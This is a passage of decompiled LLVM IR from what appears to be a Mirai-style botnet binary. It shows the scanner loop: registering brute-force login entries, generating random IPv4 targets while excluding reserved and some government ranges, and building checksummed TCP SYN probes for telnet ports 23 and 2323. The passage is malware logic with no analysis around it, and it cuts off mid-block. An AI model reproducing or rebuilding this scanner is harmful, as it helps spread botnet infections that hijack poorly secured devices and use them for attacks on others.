  store i32 13, i32* %r2.global-to-local, align 4
  %v5_ecd8 = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_19608.169 to i32), i32 ptrtoint ([7 x i8]* @global_var_19638.181 to i32), i32 13)
  store i32 ptrtoint (i32* @global_var_19640.183 to i32), i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  %v4_ece8 = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_19608.169 to i32), i32 ptrtoint (i32* @global_var_19640.183 to i32), i32 12)
  %v2_ecf0 = ptrtoint i32* %stack_var_-1866 to i32
  store i32 %v2_ecf0, i32* @lr, align 4
  %v1_f018 = add i32 %v2_ecf0, 20
  %v1_f078 = add i32 %v2_ecf0, 16
  %v2_f078 = inttoptr i32 %v1_f078 to i32*
  %v1_f11c = add i32 %v2_ecf0, 12
  %v2_f11c = inttoptr i32 %v1_f11c to i32*
  %v2_f30c = ptrtoint i32* %stack_var_-40 to i32
  %v2_f354 = ptrtoint i32* %stack_var_-68 to i32
  %v2_f358 = ptrtoint i32* %stack_var_-224 to i32
  %v2_f35c = ptrtoint i32* %stack_var_-352 to i32
  %v2_fdc4 = ptrtoint i32* %stack_var_-45 to i32
  %v2_fdd8 = ptrtoint i32* %stack_var_-77 to i32
  %v2_fd30 = ptrtoint i32* %stack_var_-60 to i32
  %v2_f5a8 = ptrtoint i32* %stack_var_-104 to i32
  %v2_10068 = ptrtoint i32* %stack_var_-96 to i32
  %v2_100c0 = ptrtoint i32* %stack_var_-42 to i32
  %v1_f088 = add i32 %v2_ecf0, 9
  %v2_f088 = inttoptr i32 %v1_f088 to i8*
  br label %dec_label_pc_ecf8

dec_label_pc_ecf8:                                ; preds = %dec_label_pc_f4fc, %dec_label_pc_ebf0
  %stack_var_-1880.0 = phi i32 [ %tmp334, %dec_label_pc_ebf0 ], [ %stack_var_-1880.1, %dec_label_pc_f4fc ]
  store i32 ptrtoint (i32* @global_var_21f84.142 to i32), i32* %r1.global-to-local, align 4
  store i32 %stack_var_-1880.0, i32* %r2.global-to-local, align 4
  %v2_ed00 = load i32, i32* @global_var_21f84.142, align 4
  store i32 %v2_ed00, i32* @r4, align 4
  %v3_ed04 = icmp uge i32 %stack_var_-1880.0, %v2_ed00
  store i1 %v3_ed04, i1* %cpsr_c.global-to-local, align 1
  %v9_ed04 = icmp eq i32 %stack_var_-1880.0, %v2_ed00
  store i1 %v9_ed04, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ed04, label %dec_label_pc_f00c, label %dec_label_pc_ed0c

dec_label_pc_ed0c:                                ; preds = %dec_label_pc_ecf8
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-52, align 4
  store i32 %v2_10068, i32* @r5, align 4
  br label %dec_label_pc_ed1c

dec_label_pc_ed1c:                                ; preds = %bb407, %dec_label_pc_ed0c
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-96, align 4
  %v0_ed30 = call i32 @rand_next()
  %v1_ed30 = trunc i32 %v0_ed30 to i16
  store i32 ptrtoint (i32* @global_var_24a4c.59 to i32), i32* %ip.global-to-local, align 4
  %v2_ed3c = load i32, i32* @global_var_24a4c.59, align 4
  store i32 %v2_ed3c, i32* %r3.global-to-local, align 4
  store i16 %v1_ed30, i16* bitcast (i32* @global_var_21f58.162 to i16*), align 4
  store i32 %v2_ed3c, i32* @global_var_21f60.184, align 4
  br label %dec_label_pc_ed48

dec_label_pc_ed48:                                ; preds = %dec_label_pc_eea0, %dec_label_pc_ed78, %dec_label_pc_eed4, %dec_label_pc_eec8, %dec_label_pc_eebc, %dec_label_pc_eeb0, %.thread47, %.thread31, %.thread27, %.thread23, %bb398, %bb397, %bb396, %bb395, %bb394, %bb393, %bb392, %bb391, %bb390, %bb389, %dec_label_pc_ee14, %dec_label_pc_ee0c, %bb383, %dec_label_pc_eddc, %dec_label_pc_edb8, %bb376, %dec_label_pc_ed88, %bb375, %dec_label_pc_ed70, %bb374, %bb400, %dec_label_pc_ed1c
  %v0_ed48 = call i32 @rand_next()
  %v1_ed4c = urem i32 %v0_ed48, 256
  store i32 %v1_ed4c, i32* %r1.global-to-local, align 4
  %v3_ed50 = udiv i32 %v0_ed48, 256
  store i32 %v3_ed50, i32* %r3.global-to-local, align 4
  %v3_ed54 = udiv i32 %v0_ed48, 65536
  store i32 %v3_ed54, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ed58 = icmp eq i32 %v1_ed4c, 0
  store i1 %v2_ed58, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ed58, label %bb374, label %bb373

bb373:                                            ; preds = %dec_label_pc_ed48
  %v3_ed5c = icmp ugt i32 %v1_ed4c, 126
  store i1 %v3_ed5c, i1* %cpsr_c.global-to-local, align 1
  %v8_ed5c = icmp eq i32 %v1_ed4c, 127
  store i1 %v8_ed5c, i1* %cpsr_z.global-to-local, align 1
  br label %bb374

bb374:                                            ; preds = %dec_label_pc_ed48, %bb373
  %v0_ed6c = phi i1 [ true, %dec_label_pc_ed48 ], [ %v8_ed5c, %bb373 ]
  %v1_ed60 = urem i32 %v3_ed50, 256
  store i32 %v1_ed60, i32* %ip.global-to-local, align 4
  %v1_ed64 = urem i32 %v3_ed54, 256
  store i32 %v1_ed64, i32* %r2.global-to-local, align 4
  %v1_ed68 = and i32 %v0_ed48, 8388608
  %v2_ed68 = icmp ne i32 %v1_ed68, 0
  store i1 %v2_ed68, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_ed6c, label %dec_label_pc_ed48, label %dec_label_pc_ed70

dec_label_pc_ed70:                                ; preds = %bb374
  %v2_ed70 = icmp ugt i32 %v1_ed4c, 2
  store i1 %v2_ed70, i1* %cpsr_c.global-to-local, align 1
  %v7_ed70 = icmp eq i32 %v1_ed4c, 3
  store i1 %v7_ed70, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ed70, label %dec_label_pc_ed48, label %dec_label_pc_ed78

dec_label_pc_ed78:                                ; preds = %dec_label_pc_ed70
  %v1_ed78 = add nsw i32 %v1_ed4c, -15
  store i32 %v1_ed78, i32* %r3.global-to-local, align 4
  %v2_ed7c = icmp ugt i32 %v1_ed4c, 55
  store i1 %v2_ed7c, i1* %cpsr_c.global-to-local, align 1
  %v7_ed7c = icmp eq i32 %v1_ed4c, 56
  store i1 %v7_ed7c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ed7c, label %dec_label_pc_ed48, label %bb375

bb375:                                            ; preds = %dec_label_pc_ed78
  %v3_ed80 = icmp ne i32 %v1_ed78, 0
  store i1 %v3_ed80, i1* %cpsr_c.global-to-local, align 1
  %v8_ed80 = icmp eq i32 %v1_ed78, 1
  store i1 %v8_ed80, i1* %cpsr_z.global-to-local, align 1
  %v2_ed84 = xor i1 %v3_ed80, true
  %v3_ed84 = or i1 %v8_ed80, %v2_ed84
  br i1 %v3_ed84, label %dec_label_pc_ed48, label %dec_label_pc_ed88

dec_label_pc_ed88:                                ; preds = %bb375
  %v2_ed88 = icmp ugt i32 %v1_ed4c, 9
  store i1 %v2_ed88, i1* %cpsr_c.global-to-local, align 1
  %v7_ed88 = icmp eq i32 %v1_ed4c, 10
  store i1 %v7_ed88, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ed88, label %dec_label_pc_ed48, label %dec_label_pc_ed90

dec_label_pc_ed90:                                ; preds = %dec_label_pc_ed88
  %v2_ed90 = icmp ugt i32 %v1_ed4c, 191
  store i1 %v2_ed90, i1* %cpsr_c.global-to-local, align 1
  %v7_ed90 = icmp eq i32 %v1_ed4c, 192
  store i1 %v7_ed90, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ed90, label %bb376, label %dec_label_pc_ed9c

bb376:                                            ; preds = %dec_label_pc_ed90
  %v3_ed94 = icmp ugt i32 %v1_ed60, 167
  store i1 %v3_ed94, i1* %cpsr_c.global-to-local, align 1
  %v8_ed94 = icmp eq i32 %v1_ed60, 168
  store i1 %v8_ed94, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_ed94, label %dec_label_pc_ed48, label %dec_label_pc_ed9c

dec_label_pc_ed9c:                                ; preds = %dec_label_pc_ed90, %bb376
  %v7_ed9c = icmp eq i32 %v1_ed4c, 172
  %.460 = zext i1 %v7_ed9c to i32
  store i32 %.460, i32* %r3.global-to-local, align 4
  %v2_eda8 = icmp ugt i32 %v1_ed60, 14
  store i1 %v2_eda8, i1* %cpsr_c.global-to-local, align 1
  %v7_eda8 = icmp eq i32 %v1_ed60, 15
  store i1 %v7_eda8, i1* %cpsr_z.global-to-local, align 1
  %v2_edac = xor i1 %v2_eda8, true
  %v3_edac = or i1 %v7_eda8, %v2_edac
  br i1 %v3_edac, label %.thread7, label %bb379

.thread7:                                         ; preds = %dec_label_pc_ed9c
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_edc0

bb379:                                            ; preds = %dec_label_pc_ed9c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_edb0 = icmp eq i1 %v7_ed9c, false
  store i1 %v2_edb0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_edb0, label %dec_label_pc_edc0, label %dec_label_pc_edb8

dec_label_pc_edb8:                                ; preds = %bb379
  %v2_edb8 = icmp ugt i32 %v1_ed60, 30
  store i1 %v2_edb8, i1* %cpsr_c.global-to-local, align 1
  %v7_edb8 = icmp eq i32 %v1_ed60, 31
  store i1 %v7_edb8, i1* %cpsr_z.global-to-local, align 1
  %v2_edbc = xor i1 %v2_edb8, true
  %v3_edbc = or i1 %v7_edb8, %v2_edbc
  br i1 %v3_edbc, label %dec_label_pc_ed48, label %dec_label_pc_edc0

dec_label_pc_edc0:                                ; preds = %.thread7, %dec_label_pc_edb8, %bb379
  %v7_edc0 = icmp eq i32 %v1_ed4c, 100
  %.461 = zext i1 %v7_edc0 to i32
  store i32 %.461, i32* %r3.global-to-local, align 4
  %v2_edcc = icmp ugt i32 %v1_ed60, 62
  store i1 %v2_edcc, i1* %cpsr_c.global-to-local, align 1
  %v7_edcc = icmp eq i32 %v1_ed60, 63
  store i1 %v7_edcc, i1* %cpsr_z.global-to-local, align 1
  %v2_edd0 = xor i1 %v2_edcc, true
  %v3_edd0 = or i1 %v7_edcc, %v2_edd0
  br i1 %v3_edd0, label %.thread12, label %bb382

.thread12:                                        ; preds = %dec_label_pc_edc0
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_ede4

bb382:                                            ; preds = %dec_label_pc_edc0
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_edd4 = icmp eq i1 %v7_edc0, false
  store i1 %v2_edd4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_edd4, label %dec_label_pc_ede4, label %dec_label_pc_eddc

dec_label_pc_eddc:                                ; preds = %bb382
  %v2_eddc = icmp ugt i32 %v1_ed60, 125
  store i1 %v2_eddc, i1* %cpsr_c.global-to-local, align 1
  %v7_eddc = icmp eq i32 %v1_ed60, 126
  store i1 %v7_eddc, i1* %cpsr_z.global-to-local, align 1
  %v2_ede0 = xor i1 %v2_eddc, true
  %v3_ede0 = or i1 %v7_eddc, %v2_ede0
  br i1 %v3_ede0, label %dec_label_pc_ed48, label %dec_label_pc_ede4

dec_label_pc_ede4:                                ; preds = %.thread12, %dec_label_pc_eddc, %bb382
  %v2_ede4 = icmp ugt i32 %v1_ed4c, 168
  store i1 %v2_ede4, i1* %cpsr_c.global-to-local, align 1
  %v7_ede4 = icmp eq i32 %v1_ed4c, 169
  store i1 %v7_ede4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ede4, label %bb383, label %dec_label_pc_edf0

bb383:                                            ; preds = %dec_label_pc_ede4
  %v3_ede8 = icmp eq i32 %v1_ed60, 255
  store i1 %v3_ede8, i1* %cpsr_c.global-to-local, align 1
  store i1 %v3_ede8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_ede8, label %dec_label_pc_ed48, label %dec_label_pc_edf0

dec_label_pc_edf0:                                ; preds = %dec_label_pc_ede4, %bb383
  %v7_edf0 = icmp eq i32 %v1_ed4c, 198
  %.462 = zext i1 %v7_edf0 to i32
  store i32 %.462, i32* %r3.global-to-local, align 4
  %v2_edfc = icmp ugt i32 %v1_ed60, 16
  store i1 %v2_edfc, i1* %cpsr_c.global-to-local, align 1
  %v7_edfc = icmp eq i32 %v1_ed60, 17
  store i1 %v7_edfc, i1* %cpsr_z.global-to-local, align 1
  %v2_ee00 = xor i1 %v2_edfc, true
  %v3_ee00 = or i1 %v7_edfc, %v2_ee00
  br i1 %v3_ee00, label %.thread18, label %bb386

.thread18:                                        ; preds = %dec_label_pc_edf0
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_ee14

bb386:                                            ; preds = %dec_label_pc_edf0
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ee04 = icmp eq i1 %v7_edf0, false
  store i1 %v2_ee04, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ee04, label %dec_label_pc_ee14, label %dec_label_pc_ee0c

dec_label_pc_ee0c:                                ; preds = %bb386
  %v2_ee0c = icmp ugt i32 %v1_ed60, 18
  store i1 %v2_ee0c, i1* %cpsr_c.global-to-local, align 1
  %v7_ee0c = icmp eq i32 %v1_ed60, 19
  store i1 %v7_ee0c, i1* %cpsr_z.global-to-local, align 1
  %v2_ee10 = xor i1 %v2_ee0c, true
  %v3_ee10 = or i1 %v7_ee0c, %v2_ee10
  br i1 %v3_ee10, label %dec_label_pc_ed48, label %dec_label_pc_ee14

dec_label_pc_ee14:                                ; preds = %.thread18, %dec_label_pc_ee0c, %bb386
  %v2_ee14 = icmp ugt i32 %v1_ed4c, 222
  store i1 %v2_ee14, i1* %cpsr_c.global-to-local, align 1
  %v7_ee14 = icmp eq i32 %v1_ed4c, 223
  store i1 %v7_ee14, i1* %cpsr_z.global-to-local, align 1
  %v2_ee18 = xor i1 %v7_ee14, true
  %v3_ee18 = and i1 %v2_ee14, %v2_ee18
  br i1 %v3_ee18, label %dec_label_pc_ed48, label %dec_label_pc_ee1c

dec_label_pc_ee1c:                                ; preds = %dec_label_pc_ee14
  %v7_ee1c = icmp eq i32 %v1_ed4c, 106
  %.463 = zext i1 %v7_ee1c to i32
  %v2_ee28 = icmp ugt i32 %v1_ed60, 185
  store i1 %v2_ee28, i1* %cpsr_c.global-to-local, align 1
  %v7_ee28 = icmp eq i32 %v1_ed60, 186
  store i1 %v7_ee28, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ee28, label %bb389, label %dec_label_pc_ee34

bb389:                                            ; preds = %dec_label_pc_ee1c
  %v2_ee1c = icmp ugt i32 %v1_ed4c, 105
  store i1 %v2_ee1c, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_ee1c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ee1c, label %dec_label_pc_ed48, label %dec_label_pc_ee34

dec_label_pc_ee34:                                ; preds = %dec_label_pc_ee1c, %bb389
  %v2_ee34 = icmp ugt i32 %v1_ed60, 186
  store i1 %v2_ee34, i1* %cpsr_c.global-to-local, align 1
  %v7_ee34 = icmp eq i32 %v1_ed60, 187
  store i1 %v7_ee34, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ee34, label %.thread23, label %.thread24

.thread24:                                        ; preds = %dec_label_pc_ee34
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_ee48

.thread23:                                        ; preds = %dec_label_pc_ee34
  store i32 %.463, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ee40 = icmp eq i1 %v7_ee1c, false
  store i1 %v2_ee40, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ee40, label %dec_label_pc_ee48, label %dec_label_pc_ed48

dec_label_pc_ee48:                                ; preds = %.thread24, %.thread23
  %v2_ee48 = icmp ugt i32 %v1_ed60, 184
  store i1 %v2_ee48, i1* %cpsr_c.global-to-local, align 1
  %v7_ee48 = icmp eq i32 %v1_ed60, 185
  store i1 %v7_ee48, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ee48, label %.thread27, label %.thread28

.thread28:                                        ; preds = %dec_label_pc_ee48
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_ee5c

.thread27:                                        ; preds = %dec_label_pc_ee48
  store i32 %.463, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ee54 = icmp eq i1 %v7_ee1c, false
  store i1 %v2_ee54, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ee54, label %dec_label_pc_ee5c, label %dec_label_pc_ed48

dec_label_pc_ee5c:                                ; preds = %.thread28, %.thread27
  %v2_ee5c = icmp ugt i32 %v1_ed60, 183
  store i1 %v2_ee5c, i1* %cpsr_c.global-to-local, align 1
  %v7_ee5c = icmp eq i32 %v1_ed60, 184
  store i1 %v7_ee5c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ee5c, label %.thread31, label %.thread32

.thread32:                                        ; preds = %dec_label_pc_ee5c
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_ee70

.thread31:                                        ; preds = %dec_label_pc_ee5c
  store i32 %.463, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ee68 = icmp eq i1 %v7_ee1c, false
  store i1 %v2_ee68, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ee68, label %dec_label_pc_ee70, label %dec_label_pc_ed48

dec_label_pc_ee70:                                ; preds = %.thread32, %.thread31
  %v2_ee70 = icmp ugt i32 %v1_ed4c, 149
  store i1 %v2_ee70, i1* %cpsr_c.global-to-local, align 1
  %v7_ee70 = icmp eq i32 %v1_ed4c, 150
  store i1 %v7_ee70, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ee70, label %bb390, label %dec_label_pc_ee7c

bb390:                                            ; preds = %dec_label_pc_ee70
  %v3_ee74 = icmp ugt i32 %v1_ed60, 30
  store i1 %v3_ee74, i1* %cpsr_c.global-to-local, align 1
  %v8_ee74 = icmp eq i32 %v1_ed60, 31
  store i1 %v8_ee74, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_ee74, label %dec_label_pc_ed48, label %dec_label_pc_ee7c

dec_label_pc_ee7c:                                ; preds = %dec_label_pc_ee70, %bb390
  %v2_ee7c = icmp ugt i32 %v1_ed4c, 48
  store i1 %v2_ee7c, i1* %cpsr_c.global-to-local, align 1
  %v7_ee7c = icmp eq i32 %v1_ed4c, 49
  store i1 %v7_ee7c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ee7c, label %bb391, label %dec_label_pc_ee88

bb391:                                            ; preds = %dec_label_pc_ee7c
  %v3_ee80 = icmp ugt i32 %v1_ed60, 50
  store i1 %v3_ee80, i1* %cpsr_c.global-to-local, align 1
  %v8_ee80 = icmp eq i32 %v1_ed60, 51
  store i1 %v8_ee80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_ee80, label %dec_label_pc_ed48, label %dec_label_pc_ee88

dec_label_pc_ee88:                                ; preds = %dec_label_pc_ee7c, %bb391
  %v2_ee88 = icmp ugt i32 %v1_ed4c, 177
  store i1 %v2_ee88, i1* %cpsr_c.global-to-local, align 1
  %v7_ee88 = icmp eq i32 %v1_ed4c, 178
  store i1 %v7_ee88, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ee88, label %bb392, label %dec_label_pc_ee94

bb392:                                            ; preds = %dec_label_pc_ee88
  %v3_ee8c = icmp ugt i32 %v1_ed60, 61
  store i1 %v3_ee8c, i1* %cpsr_c.global-to-local, align 1
  %v8_ee8c = icmp eq i32 %v1_ed60, 62
  store i1 %v8_ee8c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_ee8c, label %dec_label_pc_ed48, label %dec_label_pc_ee94

dec_label_pc_ee94:                                ; preds = %dec_label_pc_ee88, %bb392
  %v2_ee94 = icmp ugt i32 %v1_ed4c, 159
  store i1 %v2_ee94, i1* %cpsr_c.global-to-local, align 1
  %v7_ee94 = icmp eq i32 %v1_ed4c, 160
  store i1 %v7_ee94, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ee94, label %bb393, label %dec_label_pc_eea0

bb393:                                            ; preds = %dec_label_pc_ee94
  %v3_ee98 = icmp ugt i32 %v1_ed60, 12
  store i1 %v3_ee98, i1* %cpsr_c.global-to-local, align 1
  %v8_ee98 = icmp eq i32 %v1_ed60, 13
  store i1 %v8_ee98, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_ee98, label %dec_label_pc_ed48, label %dec_label_pc_eea0

dec_label_pc_eea0:                                ; preds = %dec_label_pc_ee94, %bb393
  %v1_eea0 = add nsw i32 %v1_ed4c, -6
  store i32 %v1_eea0, i32* %r3.global-to-local, align 4
  %v2_eea4 = icmp ugt i32 %v1_ed4c, 10
  store i1 %v2_eea4, i1* %cpsr_c.global-to-local, align 1
  %v7_eea4 = icmp eq i32 %v1_ed4c, 11
  store i1 %v7_eea4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_eea4, label %dec_label_pc_ed48, label %bb394

bb394:                                            ; preds = %dec_label_pc_eea0
  %v3_eea8 = icmp ne i32 %v1_eea0, 0
  store i1 %v3_eea8, i1* %cpsr_c.global-to-local, align 1
  %v8_eea8 = icmp eq i32 %v1_eea0, 1
  store i1 %v8_eea8, i1* %cpsr_z.global-to-local, align 1
  %v2_eeac = xor i1 %v3_eea8, true
  %v3_eeac = or i1 %v8_eea8, %v2_eeac
  br i1 %v3_eeac, label %dec_label_pc_ed48, label %dec_label_pc_eeb0

dec_label_pc_eeb0:                                ; preds = %bb394
  %v2_eeb0 = icmp ugt i32 %v1_ed4c, 21
  store i1 %v2_eeb0, i1* %cpsr_c.global-to-local, align 1
  %v7_eeb0 = icmp eq i32 %v1_ed4c, 22
  store i1 %v7_eeb0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_eeb0, label %dec_label_pc_ed48, label %bb395

bb395:                                            ; preds = %dec_label_pc_eeb0
  %v3_eeb4 = icmp ugt i32 %v1_ed4c, 20
  store i1 %v3_eeb4, i1* %cpsr_c.global-to-local, align 1
  %v8_eeb4 = icmp eq i32 %v1_ed4c, 21
  store i1 %v8_eeb4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_eeb4, label %dec_label_pc_ed48, label %dec_label_pc_eebc

dec_label_pc_eebc:                                ; preds = %bb395
  %v2_eebc = icmp ugt i32 %v1_ed4c, 27
  store i1 %v2_eebc, i1* %cpsr_c.global-to-local, align 1
  %v7_eebc = icmp eq i32 %v1_ed4c, 28
  store i1 %v7_eebc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_eebc, label %dec_label_pc_ed48, label %bb396

bb396:                                            ; preds = %dec_label_pc_eebc
  %v3_eec0 = icmp ugt i32 %v1_ed4c, 25
  store i1 %v3_eec0, i1* %cpsr_c.global-to-local, align 1
  %v8_eec0 = icmp eq i32 %v1_ed4c, 26
  store i1 %v8_eec0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_eec0, label %dec_label_pc_ed48, label %dec_label_pc_eec8

dec_label_pc_eec8:                                ; preds = %bb396
  %v2_eec8 = icmp ugt i32 %v1_ed4c, 29
  store i1 %v2_eec8, i1* %cpsr_c.global-to-local, align 1
  %v7_eec8 = icmp eq i32 %v1_ed4c, 30
  store i1 %v7_eec8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_eec8, label %dec_label_pc_ed48, label %bb397

bb397:                                            ; preds = %dec_label_pc_eec8
  %v3_eecc = icmp ugt i32 %v1_ed4c, 28
  store i1 %v3_eecc, i1* %cpsr_c.global-to-local, align 1
  %v8_eecc = icmp eq i32 %v1_ed4c, 29
  store i1 %v8_eecc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_eecc, label %dec_label_pc_ed48, label %dec_label_pc_eed4

dec_label_pc_eed4:                                ; preds = %bb397
  %v2_eed4 = icmp ugt i32 %v1_ed4c, 54
  store i1 %v2_eed4, i1* %cpsr_c.global-to-local, align 1
  %v7_eed4 = icmp eq i32 %v1_ed4c, 55
  store i1 %v7_eed4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_eed4, label %dec_label_pc_ed48, label %bb398

bb398:                                            ; preds = %dec_label_pc_eed4
  %v3_eed8 = icmp ugt i32 %v1_ed4c, 32
  store i1 %v3_eed8, i1* %cpsr_c.global-to-local, align 1
  %v8_eed8 = icmp eq i32 %v1_ed4c, 33
  store i1 %v8_eed8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_eed8, label %dec_label_pc_ed48, label %dec_label_pc_eee0

dec_label_pc_eee0:                                ; preds = %bb398
  %v2_eee0 = icmp ugt i32 %v1_ed4c, 214
  store i1 %v2_eee0, i1* %cpsr_c.global-to-local, align 1
  %v7_eee0 = icmp eq i32 %v1_ed4c, 215
  store i1 %v7_eee0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_eee0, label %.thread47, label %bb399

bb399:                                            ; preds = %dec_label_pc_eee0
  %v3_eee4 = icmp ugt i32 %v1_ed4c, 213
  store i1 %v3_eee4, i1* %cpsr_c.global-to-local, align 1
  %v8_eee4 = icmp eq i32 %v1_ed4c, 214
  store i1 %v8_eee4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_eee4, label %bb400, label %dec_label_pc_eef4

.thread47:                                        ; preds = %dec_label_pc_eee0
  br label %dec_label_pc_ed48

bb400:                                            ; preds = %bb399
  br label %dec_label_pc_ed48

dec_label_pc_eef4:                                ; preds = %bb399
  %v5_ef00 = call i32 @llvm.bswap.i32(i32 %v0_ed48)
  store i32 %v5_ef00, i32* %r3.global-to-local, align 4
  %tmp401 = and i32 %v0_ed48, 65280
  %tmp402 = call i32 @llvm.bswap.i32(i32 %tmp401)
  %v3_ef08 = udiv i32 %v5_ef00, 16777216
  %tmp403 = and i32 %v0_ed48, 16711680
  %tmp404 = call i32 @llvm.bswap.i32(i32 %tmp403)
  %v4_ef10 = udiv i32 %tmp402, 256
  %v4_ef14 = mul nuw nsw i32 %tmp404, 256
  store i32 ptrtoint (i8** @global_var_21f54.157 to i32), i32* @r0, align 4
  %tmp405 = and i32 %v0_ed48, 65536
  %v3_ef1c = icmp ne i32 %tmp405, 0
  store i1 %v3_ef1c, i1* %cpsr_c.global-to-local, align 1
  %v4_ef1c = mul i32 %v5_ef00, 16777216
  %v5_ef10 = or i32 %v4_ef1c, %v3_ef08
  %v5_ef14 = or i32 %v5_ef10, %v4_ef10
  %v5_ef1c = or i32 %v5_ef14, %v4_ef14
  store i32 %v5_ef1c, i32* %r2.global-to-local, align 4
  store i16 0, i16* bitcast (i32* @global_var_21f5e.185 to i16*), align 4
  store i32 20, i32* %r1.global-to-local, align 4
  store i32 %v5_ef1c, i32* @global_var_21f64.186, align 4
  %v3_ef2c = call i32 @checksum_generic(i32 ptrtoint (i8** @global_var_21f54.157 to i32), i32 20)
  %v4_ef2c = trunc i32 %v3_ef2c to i16
  %v3_ef30 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_ef30, i32* %r1.global-to-local, align 4
  %v5_ef40 = sdiv i32 %v3_ef30, 10
  %v3_ef44 = mul i32 %v5_ef40, 8
  store i32 %v3_ef44, i32* %r2.global-to-local, align 4
  %v2_ef4c = mul i32 %v5_ef40, 10
  store i32 %v2_ef4c, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i8** @global_var_21f54.157 to i32), i32* %ip.global-to-local, align 4
  %v3_ef54 = icmp uge i32 %v3_ef30, %v2_ef4c
  store i1 %v3_ef54, i1* %cpsr_c.global-to-local, align 1
  %v9_ef54 = icmp eq i32 %v3_ef30, %v2_ef4c
  store i1 %v9_ef54, i1* %cpsr_z.global-to-local, align 1
  store i16 %v4_ef2c, i16* bitcast (i32* @global_var_21f5e.185 to i16*), align 4
  br i1 %v9_ef54, label %.thread56.thread, label %bb406

.thread56.thread:                                 ; preds = %dec_label_pc_eef4
  store i32 4873, i32* %r3.global-to-local, align 4
  store i16 4873, i16* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21f68.160 to i32), i32 2) to i16*), align 2
  %v4_ef70288 = load i32, i32* @global_var_21f64.186, align 4
  store i32 %v4_ef70288, i32* @global_var_21f6c.188, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  br label %bb407

bb406:                                            ; preds = %dec_label_pc_eef4
  %v4_ef70291 = load i32, i32* @global_var_21f64.186, align 4
  store i32 ptrtoint (i32* @global_var_21f68.160 to i32), i32* %r1.global-to-local, align 4
  store i32 5888, i32* %r2.global-to-local, align 4
  store i32 %v4_ef70291, i32* @global_var_21f6c.188, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  store i16 5888, i16* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21f68.160 to i32), i32 2) to i16*), align 2
  br label %bb407

bb407:                                            ; preds = %.thread56.thread, %bb406
